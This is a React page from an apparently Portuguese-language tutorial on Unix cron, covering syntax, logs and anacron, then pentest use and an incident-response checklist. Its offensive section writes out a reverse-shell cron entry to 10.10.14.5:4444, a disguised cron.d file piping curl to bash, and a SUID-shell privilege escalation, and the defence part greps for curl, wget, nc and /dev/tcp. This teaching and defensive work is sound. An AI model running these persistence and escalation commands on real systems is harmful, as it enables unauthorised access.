import { PageContainer } from "@/components/layout/PageContainer";
import { AlertBox } from "@/components/ui/AlertBox";
import { CodeBlock } from "@/components/ui/CodeBlock";
import { CommandTable } from "@/components/ui/CommandTable";
import { PracticeBox } from "@/components/ui/PracticeBox";
import { Terminal } from "@/components/ui/Terminal";

export default function Cron() {
  return (
    <PageContainer
      title="Cron — agendamento e persistência"
      subtitle="A ferramenta de scheduling do Unix. Sysadmin usa pra backup; pentester usa pra persistence e privesc."
      difficulty="intermediario"
      timeToRead="18 min"
    >
      <h2>Anatomia do cron</h2>
      <p>
        O daemon <strong>cron</strong> (no Kali: serviço <code>cron.service</code>) lê crontabs
        — arquivos de texto com instruções "rodar este comando neste momento". Existem 4 fontes
        de crontab que o cron junta a cada minuto:
      </p>
      <ul>
        <li><code>/var/spool/cron/crontabs/&lt;user&gt;</code> — crontab pessoal (editado via <code>crontab -e</code>).</li>
        <li><code>/etc/crontab</code> — crontab do sistema (formato com coluna USER extra).</li>
        <li><code>/etc/cron.d/*</code> — fragmentos por pacote (também com coluna USER).</li>
        <li><code>/etc/cron.{`{hourly,daily,weekly,monthly}`}/</code> — scripts disparados pelo run-parts.</li>
      </ul>

      <Terminal
        path="~"
        lines={[
          {
            cmd: "systemctl status cron --no-pager | head -8",
            out: `● cron.service - Regular background program processing daemon
     Loaded: loaded (/lib/systemd/system/cron.service; enabled; preset: enabled)
     Active: active (running) since Fri 2026-04-03 08:42:19 -03; 5h 41min ago
       Docs: man:cron(8)
   Main PID: 812 (cron)
      Tasks: 1 (limit: 9418)
     Memory: 524.0K
        CPU: 12ms
     CGroup: /system.slice/cron.service
             └─812 /usr/sbin/cron -f`,
            outType: "success",
          },
          {
            cmd: "ls -la /etc/cron*",
            out: `-rw-r--r-- 1 root root 1136 Apr 03 08:42 /etc/crontab

/etc/cron.d:
total 24
-rw-r--r-- 1 root root  201 Mar  4 11:21 anacron
-rw-r--r-- 1 root root  712 Mar  4 11:21 e2scrub_all
-rw-r--r-- 1 root root  102 Mar  4 11:21 .placeholder

/etc/cron.daily:
total 36
-rwxr-xr-x 1 root root  376 Mar  4 11:21 apt-compat
-rwxr-xr-x 1 root root 1478 Mar  4 11:21 dpkg
-rwxr-xr-x 1 root root  214 Mar  4 11:21 logrotate
-rwxr-xr-x 1 root root 1335 Mar  4 11:21 man-db`,
            outType: "info",
          },
        ]}
      />

      <h2>Sintaxe do crontab</h2>
      <CodeBlock
        language="bash"
        title="formato dos campos"
        code={`# ┌───────────── minuto         (0 - 59)
# │ ┌─────────── hora           (0 - 23)
# │ │ ┌───────── dia do mês     (1 - 31)
# │ │ │ ┌─────── mês            (1 - 12)
# │ │ │ │ ┌───── dia da semana  (0 - 6, 0=domingo)
# │ │ │ │ │
# * * * * * comando

# Operadores:
#   *       todos os valores
#   ,       lista (1,15,30)
#   -       intervalo (8-17)
#   /       step (*/5 = a cada 5)
#   @reboot @hourly @daily @weekly @monthly @yearly

*/5 * * * *  /usr/local/bin/coleta.sh         # a cada 5 minutos
0 */2 * * *  /usr/local/bin/sync.sh           # de 2 em 2 horas
0 3 * * *    /opt/backup/backup.sh            # diário às 03:00
0 9 * * 1-5  /usr/local/bin/relatorio.sh      # 09:00 seg-sex
30 4 1 * *   /usr/local/bin/mensal.sh         # dia 1 do mês às 04:30
@reboot      /home/wallyson/c2/implant.sh     # toda vez que o host bootar`}
      />

      <h2>Edição e visualização</h2>
      <CommandTable
        title="crontab — comandos do dia a dia"
        variations={[
          { cmd: "crontab -e", desc: "Edita o crontab do usuário atual.", output: "Abre $EDITOR (vim/nano). Valida sintaxe ao salvar." },
          { cmd: "crontab -l", desc: "Lista o crontab atual.", output: "*/5 * * * * /usr/local/bin/coleta.sh" },
          { cmd: "crontab -r", desc: "REMOVE TODO o crontab (sem confirmar — cuidado).", output: "Quer confirmar: -i." },
          { cmd: "crontab -u wallyson -l", desc: "Lista o crontab de outro usuário (precisa root).", output: "Em IR é a primeira coisa a checar." },
          { cmd: "crontab arquivo.txt", desc: "Substitui o crontab pelo conteúdo do arquivo.", output: "Útil em scripts de provisionamento." },
          { cmd: "crontab -e -u root", desc: "Edita o crontab do root (precisa sudo).", output: "Persistence persistente." },
        ]}
      />

      <Terminal
        path="~"
        lines={[
          {
            cmd: "crontab -l",
            out: `# m h  dom mon dow   command
*/10 * * * *  /home/wallyson/scripts/check-vpn.sh
0 */6 * * *   rsync -a --delete /home/wallyson/notes/ /backup/notes/
@reboot       /home/wallyson/.config/autostart/healthcheck.sh`,
            outType: "info",
          },
        ]}
      />

      <h2>/etc/crontab e /etc/cron.d (sistema)</h2>
      <p>
        <strong>Diferença crucial:</strong> crontab de usuário <em>não</em> tem coluna USER. As do sistema <em>têm</em>.
      </p>

      <CodeBlock
        language="bash"
        title="/etc/crontab"
        code={`SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
MAILTO=root

# m  h dom mon dow user  command
17 *  * * *      root  cd / && run-parts --report /etc/cron.hourly
25 6  * * *      root  test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6  * * 7      root  test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6  1 * *      root  test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )`}
      />

      <h2>Variáveis no topo do crontab</h2>
      <CommandTable
        title="o que dá pra setar"
        variations={[
          { cmd: "SHELL=/bin/bash", desc: "Shell que vai executar o comando (default /bin/sh).", output: "Use bash se seu script tem 'bashisms'." },
          { cmd: "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", desc: "PATH MÍNIMO. Cron NÃO herda do seu shell.", output: "Bug #1 do mundo: 'no shell, funciona; no cron, não'." },
          { cmd: "MAILTO=user@host", desc: "Recebe stdout/stderr do job por email.", output: "Vazio (MAILTO=\"\") = não envia." },
          { cmd: "HOME=/home/wallyson", desc: "HOME pra resolver ~ no script.", output: "Default já é o home do usuário do crontab." },
          { cmd: "CRON_TZ=America/Sao_Paulo", desc: "Timezone para AS HORAS do crontab.", output: "Sem isso usa /etc/localtime." },
        ]}
      />

      <h2>Logs do cron</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "sudo journalctl -u cron --since '10 min ago'",
            out: `Apr 03 14:30:01 kali CRON[15201]: (wallyson) CMD (/home/wallyson/scripts/check-vpn.sh)
Apr 03 14:30:01 kali CRON[15200]: (CRON) info (No MTA installed, discarding output)
Apr 03 14:35:01 kali CRON[15348]: (root) CMD (test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily ))
Apr 03 14:40:01 kali CRON[15401]: (wallyson) CMD (/home/wallyson/scripts/check-vpn.sh)`,
            outType: "info",
          },
          {
            comment: "filtra só por usuário",
            cmd: "sudo journalctl -u cron --since today | grep '(wallyson)'",
            out: `Apr 03 14:30:01 kali CRON[15201]: (wallyson) CMD (/home/wallyson/scripts/check-vpn.sh)
Apr 03 14:40:01 kali CRON[15401]: (wallyson) CMD (/home/wallyson/scripts/check-vpn.sh)`,
            outType: "default",
          },
          {
            comment: "stderr do job: redirecione PRA arquivo (cron não loga isso por padrão)",
            cmd: "tail -n 3 /var/log/cron-coleta.log",
            out: `[2026-04-03 14:40:01] Iniciando coleta...
[2026-04-03 14:40:03] OK: 28 hosts ativos
[2026-04-03 14:40:03] Coleta concluída em 2.1s`,
            outType: "success",
          },
        ]}
      />

      <AlertBox type="info" title="Sempre redirecione output dos jobs">
        Sem MTA configurado, o cron <em>descarta</em> stdout/stderr. Adicione no fim do comando:
        <code>{`>> /var/log/meujob.log 2>&1`}</code>. Se não fizer, debug fica impossível.
      </AlertBox>

      <h2>Anacron — para hosts que não ficam ligados 24/7</h2>
      <p>
        Cron pula jobs se a máquina estiver desligada na hora marcada. <strong>Anacron</strong>
        roda os atrasos no boot seguinte. Notebooks de pentester usam — se você desliga o Kali à noite,
        o <code>cron.daily</code> só roda graças ao anacron.
      </p>

      <CodeBlock
        language="bash"
        title="/etc/anacrontab"
        code={`# /etc/anacrontab: configuration file for anacron
# period(dias)  delay(min)  job-identifier   command
1               5           cron.daily       run-parts --report /etc/cron.daily
7               25          cron.weekly      run-parts --report /etc/cron.weekly
@monthly        45          cron.monthly     run-parts --report /etc/cron.monthly`}
      />

      <h2 id="pentest">Cron como vetor pentest</h2>
      <p className="text-yellow-400/90 font-semibold">
        Aqui começa o ângulo ofensivo. Cron é o mecanismo de persistência mais antigo, mais
        confiável e mais difícil de remover do mundo Unix.
      </p>

      <h3>1. Persistence pós-exploração (user level)</h3>
      <Terminal
        path="~"
        lines={[
          {
            comment: "implant que liga em casa a cada 10 minutos. Sem precisar root.",
            cmd: "(crontab -l 2>/dev/null; echo '*/10 * * * * /bin/bash -c \"bash -i >& /dev/tcp/10.10.14.5/4444 0>&1\"') | crontab -",
            out: "(silencioso — entrada acrescentada)",
            outType: "warning",
          },
          {
            cmd: "crontab -l",
            out: `*/10 * * * * /bin/bash -c "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1"`,
            outType: "error",
          },
        ]}
      />

      <h3>2. Persistence usando @reboot</h3>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "(crontab -l 2>/dev/null; echo '@reboot /home/wallyson/.cache/.helper.sh') | crontab -",
            out: "(implant nasce SOZINHO no próximo boot)",
            outType: "warning",
          },
        ]}
      />

      <h3>3. Persistence em /etc/cron.d (precisa root)</h3>
      <p>
        Mais discreto que <code>crontab -e</code>: não aparece em <code>crontab -l</code>
        do root. Defesa precisa rodar <code>cat /etc/cron.d/*</code> manualmente.
      </p>

      <CodeBlock
        language="bash"
        title="/etc/cron.d/system-update (camuflado)"
        code={`# Atualizacao automatica do sistema
SHELL=/bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

*/30 * * * * root curl -s http://10.10.14.5/u | bash > /dev/null 2>&1`}
      />

      <h3>4. PrivEsc por cron job writable</h3>
      <p>
        Bug clássico em CTF e empresa: cron rodando como root chama um script que o
        usuário comum pode editar. Game over.
      </p>

      <Terminal
        path="~"
        lines={[
          {
            comment: "enumeração: procurar qualquer cron file editavel",
            cmd: "ls -la /etc/cron*/* 2>/dev/null | grep -v root\\ root",
            out: `-rwxrwxrwx 1 root root 89 Mar 28 09:14 /etc/cron.daily/cleanup.sh`,
            outType: "error",
          },
          {
            cmd: "cat /etc/cron.daily/cleanup.sh",
            out: `#!/bin/bash
find /tmp -mtime +7 -delete
find /var/log -name '*.gz' -mtime +30 -delete`,
            outType: "default",
          },
          {
            comment: "appende SUID shell e espera o cron rodar (no máximo 24h)",
            cmd: "echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /etc/cron.daily/cleanup.sh",
            out: "(silencioso)",
            outType: "muted",
          },
          {
            comment: "depois que o cron rodar (anacron pode disparar antes):",
            cmd: "ls -la /tmp/rootbash && /tmp/rootbash -p",
            out: `-rwsr-sr-x 1 root root 1396520 Apr  3 03:00 /tmp/rootbash
bash-5.2# id
uid=1000(wallyson) gid=1000(wallyson) euid=0(root) groups=1000(wallyson)`,
            outType: "error",
          },
        ]}
      />

      <h3>5. Linpeas / pspy — automação ofensiva</h3>
      <Terminal
        path="~"
        lines={[
          {
            comment: "pspy64: monitora processos sem precisar root, vê cron rodar em real-time",
            cmd: "./pspy64 -pf -i 1000",
            out: `2026/04/03 14:50:01 CMD: UID=0    PID=15822  | /bin/sh -c /opt/scripts/internal/healthcheck.sh
2026/04/03 14:50:01 CMD: UID=0    PID=15823  | /opt/scripts/internal/healthcheck.sh
2026/04/03 14:55:01 CMD: UID=0    PID=15901  | /usr/sbin/CRON -f
2026/04/03 14:55:01 CMD: UID=1000 PID=15904  | /home/wallyson/scripts/check-vpn.sh`,
            outType: "warning",
          },
        ]}
      />

      <AlertBox type="warning" title="pspy é o melhor amigo do pentester">
        Mesmo sem root, <code>pspy</code> usa <code>inotify</code> em <code>/proc</code> pra
        ver TODA chamada de processo (incluindo cron). Em CTFs/HTB é como você descobre
        os jobs rodados pelo root.
      </AlertBox>

      <h2>Defesa / IR — checklist</h2>
      <CommandTable
        title="O que rodar quando suspeita de cron malicioso"
        variations={[
          { cmd: "for u in $(cut -d: -f1 /etc/passwd); do echo \"# $u\"; sudo crontab -u $u -l 2>/dev/null; done", desc: "Lista crontab de TODOS os usuários.", output: "# root\\n# wallyson\\n*/10 * * * * /bin/bash -c '...'" },
          { cmd: "ls -la /var/spool/cron/crontabs/", desc: "Backend file dos crontabs de usuário.", output: "Compara mtime com data do incidente." },
          { cmd: "cat /etc/crontab /etc/cron.d/*", desc: "Crontabs de sistema, com USER explícito.", output: "Procurar entradas com curl|wget|bash|nc." },
          { cmd: "ls -la /etc/cron.{hourly,daily,weekly,monthly}/", desc: "Scripts disparados pelo run-parts.", output: "Veja permissões — algum 777?" },
          { cmd: "find /etc/cron* -type f -mtime -7", desc: "Arquivos de cron modificados nos últimos 7 dias.", output: "Útil pós-incidente." },
          { cmd: "grep -rE 'curl|wget|nc|bash -i|/dev/tcp' /etc/cron* /var/spool/cron/", desc: "IOC keywords clássicos.", output: "/etc/cron.d/system-update: ... curl ... | bash" },
        ]}
      />

      <PracticeBox
        title="Encontrar e remover persistência por cron"
        goal="Em uma VM comprometida, listar todas as crontabs, identificar a maliciosa e remover."
        steps={[
          "Liste crontabs de TODOS os usuários (loop no /etc/passwd).",
          "Greppe por keywords ofensivos em /etc/cron.d, /etc/cron.daily etc.",
          "Identifique a entrada com /dev/tcp ou curl|bash.",
          "Remova com crontab -u <user> -r ou apague o arquivo de /etc/cron.d.",
          "Confirme rodando o checklist novamente.",
        ]}
        command={`# 1) listar tudo
for u in $(cut -d: -f1 /etc/passwd); do
  out=$(sudo crontab -u "$u" -l 2>/dev/null)
  [ -n "$out" ] && echo "==[ $u ]==" && echo "$out"
done

# 2) IOC scan
sudo grep -rE 'curl|wget|/dev/tcp|bash -i|nc ' /etc/cron* /var/spool/cron/ 2>/dev/null

# 3) limpeza (ex: usuario wallyson comprometido)
sudo crontab -u wallyson -r
sudo rm -f /etc/cron.d/system-update`}
        expected={`==[ wallyson ]==
*/10 * * * * /bin/bash -c "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1"
/etc/cron.d/system-update:*/30 * * * * root curl -s http://10.10.14.5/u | bash`}
        verify="Após a limpeza, rode novamente os comandos 1 e 2 — não deve mais aparecer nada suspeito. Reinicie o cron.service e monitore journalctl -u cron por 30 min."
      />

      <AlertBox type="danger" title="Ética e autorização">
        Tudo nesta página é para uso em <strong>ambientes autorizados</strong>: lab próprio,
        CTF, HackTheBox, ou contrato de pentest com escopo escrito. Cron persistence em
        sistema de terceiro sem autorização é crime no Brasil (Lei 12.737/2012 — Lei Carolina Dieckmann).
      </AlertBox>
    </PageContainer>
  );
}
